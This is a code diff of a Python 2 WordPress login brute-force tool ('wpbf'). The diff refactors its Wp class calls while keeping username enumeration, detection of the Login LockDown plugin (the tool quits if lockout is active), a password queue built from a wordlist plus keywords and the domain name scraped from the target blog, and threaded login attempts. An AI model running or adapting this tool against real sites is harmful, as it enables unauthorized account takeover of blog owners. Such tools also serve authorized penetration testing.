@@ -41,8 +41,8 @@ class WpbfThread(threading.Thread):
 	    try:
 		word = self.queue.get()
 		logger.debug("Trying with "+word)
-		if wp.login(config.url, config.username, word, None):
-		    logger.info("Password '"+word+"' found for username '"+config.username+"' on "+config.url)
+		if wp.login(config.username, word):
+		    logger.info("Password '"+word+"' found for username '"+config.username+"' on "+wp._login_url)
 		    self.queue.queue.clear()
 		self.queue.task_done()
 	    except urllib2.HTTPError, e:
@@ -83,55 +83,55 @@ if __name__ == '__main__':
     logging.config.fileConfig("logging.conf")
     logger = logging.getLogger("wpbf")
 
-    # build target url
-    logger.info("Target URL: "+config.wp_base_url)
-    config.url = urllib.basejoin(config.wp_base_url, config.script_path)
-
     # Wp perform actions over a BlogPress blog
-    wp = wp.Wp()
+    wp = wp.Wp(config.wp_base_url, config.script_path, config.proxy)
+
+    # build target url
+    logger.info("Target URL: "+wp._base_url)
 
     # enumerate usernames
     if args.enumerateusers:
 	logger.info("Enumerating users...")
-	logger.info("Usernames: "+join(wp.enumerate_usernames(config.wp_base_url, config.eu_gap_tolerance, config.proxy), ", "))
+	logger.info("Usernames: "+join(wp.enumerate_usernames(config.eu_gap_tolerance), ", "))
 	exit(0)
 
     # queue
     queue = Queue.Queue()
 
-    # check URL, username and load additional words into queue
+    # check URL and username
     logger.info("Checking URL & username...")
     try:
-        if wp.check_username(config.url, config.username, config.proxy) is False:
+        if wp.check_username(config.username) is False:
             logger.warning("Possible non existent username: "+config.username)
             logger.info("Enumerating users...")
-	    enumerated_usernames = wp.enumerate_usernames(config.wp_base_url, config.eu_gap_tolerance, config.proxy)
+	    enumerated_usernames = wp.enumerate_usernames(config.eu_gap_tolerance)
 	    if len(enumerated_usernames) > 0:
 		logger.info("Usernames: "+join(enumerated_usernames, ", "))
 		config.username = enumerated_usernames[0]
 	    else:
 		logger.info("Trying to find username in HTML content...")
-		config.username = wp.find_username(config.wp_base_url, config.proxy)
+		config.username = wp.find_username()
             if config.username is False:
                 logger.error("Can't find username :(")
                 sys.exit(0)
             else:
-                if wp.check_username(config.url, config.username, config.proxy) is False:
+                if wp.check_username(config.username) is False:
                     logger.error("Username "+config.username+" didn't work :(")
                     sys.exit(0)
                 else:
                     logger.info("Using username "+config.username)
     except urllib2.URLError:
-        logger.error("URL Error on: "+config.url)
+        logger.error("URL Error on: "+wp._login_url)
         if config.proxy:
             logger.info("Check if proxy is well configured and running")
         sys.exit(0)
     except urllib2.HTTPError:
-        logger.error("HTTP Error on: "+url)
+        logger.error("HTTP Error on: "+wp._login_url)
         sys.exit(0)
 
     # check for Login LockDown plugin
-    if wp.check_loginlockdown(config.url, config.proxy):
+    logger.debug("Checking for Login LockDown plugin")
+    if wp.check_loginlockdown():
 	logger.warning("Login LockDown plugin is active, bruteforce will be useless")
 	sys.exit(0)
 
@@ -142,13 +142,13 @@ if __name__ == '__main__':
     # load into queue additional keywords from blog main page
     if args.nokeywords:
 	logger.info("Load into queue additional words using keywords from blog...")
-	[queue.put(w) for w in wp.find_keywords_in_url(config.wp_base_url, config.proxy, config.min_keyword_len, config.min_frequency, config.ignore_with) ]
+	queue.put(filter_domain(urlparse.urlparse(wp._base_url).hostname))     # add domain name to the queue
+	[queue.put(w) for w in wp.find_keywords_in_url(config.min_keyword_len, config.min_frequency, config.ignore_with) ]
 
     # load wordlist into queue
     logger.debug("Loading wordlist...")
     [queue.put(w.strip()) for w in open(config.wordlist, "r").readlines()]
     logger.debug(str(queue.qsize())+" words loaded from "+config.wordlist)
-    queue.put(filter_domain(urlparse.urlparse(config.url).hostname))     # load queue with additional words using domain name
 
     # spawn threads
     logger.info("Bruteforcing...")
